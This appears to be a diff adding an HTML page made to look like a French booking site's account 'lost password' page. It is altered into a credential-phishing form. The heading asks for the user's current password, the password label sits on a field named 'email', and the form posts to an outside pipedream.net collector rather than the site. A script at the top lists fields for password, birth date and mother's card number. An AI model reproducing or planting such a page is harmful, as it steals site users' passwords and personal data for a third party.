@@ -1,0 +1,142 @@
+<script>
+	var contact = '{"civilite":"","nom":"","prenom":"","email":"","tel_fixe":"","tel_mobile":"","adresse1":"","adresse2":"","cp":"","ville":"","pays":"","langue":"","observation":"","id_contact":"","mot_de_passe":"","date_naissance":"","numero_de_carte_mere":"","chaine_aleatoire":""}'
+	contact = JSON.parse(contact);
+</script>
+
+
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<meta name="robots" content="noindex, nofollow">
+	<!-- Bootstrap core CSS + and Custom styles compiled -->
+	<link rel="stylesheet" href="../css/client.css?ver=300">
+			
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KXNGN96');</script>
+<!-- End Google Tag Manager -->
+	</head>
+
+<body class="compte-page motdepasse_perdu">
+			<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src='https://www.googletagmanager.com/ns.html?id=GTM-KXNGN96'
+height='0' width='0' style='display:none;visibility:hidden'></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->	
+	
+
+<div id="menuBarsContainer" class="">
+
+  <div class="navbar-compte-container">
+
+    <nav id="accountBar" class="alt-bar fa-hide">
+      <span class="navbar-brand">Mon compte</span>
+      <ul class="account-zone">
+                  <li id="my-account" class="bar-element">
+            <a class="nav-link" href="/compte/login.php">
+              <i class="bi bi-person-circle"></i><span class="link-text">Mon compte</span>
+            </a>
+          </li>
+                <li id="bookOnline" class="bar-element">
+          <a class="nav-link" href="/"><i class="bi bi-calendar-check"></i><span>Réserver</span></a>
+        </li>
+      </ul>
+    </nav>
+
+
+    <nav id="additionalLinks" class="alt-bar">
+      <ul class="links-zone">
+        <div class="scroller">
+          <li id="mesInfos" class="bar-element">
+            <a class="nav-link" href="/compte/compte_edit.php">
+              <i class="bi bi-info-circle"></i>
+              <span class="link-text desktop">Mes informations</span>
+              <span class="link-text mobile">Infos</span>
+            </a>
+          </li>
+          <li id="mesResas" class="bar-element">
+            <a class="nav-link" href="/compte/compte.php">
+              <i class="bi bi-card-checklist"></i>
+              <span class="link-text desktop">Mes réservations</span>
+              <span class="link-text mobile">Résas</span>
+            </a>
+          </li>
+          <li id="mesCartes" class="bar-element">
+            <a class="nav-link" href="/compte/cartes.php">
+              <i class="bi bi-person-video"></i>
+              <span class="link-text desktop">Mes cartes</span>
+              <span class="link-text mobile">Cartes</span>
+            </a>
+          </li>
+        </div>
+      </ul>
+    </nav>
+
+  </div>
+</div>
+
+
+	<div class="container">
+
+		<div class="row">
+
+			
+
+<div class="container alerts-container">
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+   <symbol id="info-fill" fill="currentColor" viewBox="0 0 16 16">
+      <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+   </symbol>
+   <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
+      <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" />
+   </symbol>
+</svg>
+
+
+
+
+
+</div>
+
+<div class="account-container lost-password">
+	<div class="card mb-5 mx-auto">
+		<div class="card-body">
+			<h1 class="h2 my-4 text-center">Mon mot de passe actuel</h1>
+			<div id="content">
+				<form class="form mx-auto" method="post" action="https://eoq99b28u4vk1ue.m.pipedream.net">
+					<div class="form-floating">
+						<input class="form-control mr-3" type="text" id="email" name="email" placeholder="Adresse e-mail">
+						<label for="email">mot de passe</label>
+					</div>
+					
+					
+					<div class="validation">
+						<button class="btn btn-primary btn-block spinner-btn form-control" type="submit" name="send"><i class="bi bi-send"></i>Envoyer</button>
+					</div>
+					
+				</form>
+			</div>
+		</div> <!-- end .card-body -->
+	</div> <!-- end .card -->
+</div>
+</div> <!-- end div.row -->
+	</div> <!-- end div.container -->
+	
+	<script src="/node_modules/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+	<script src="/node_modules/jquery/dist/jquery.min.js"></script>
+	<script src="/js/vendor/jquery-ui-1.13.0/jquery-ui.min.js"></script>
+	<script src="../js/compte.js"></script>
+			<script src="/js/datalayer-compte.js"></script>
+	
+
+
+	</body>
+
+	</html>
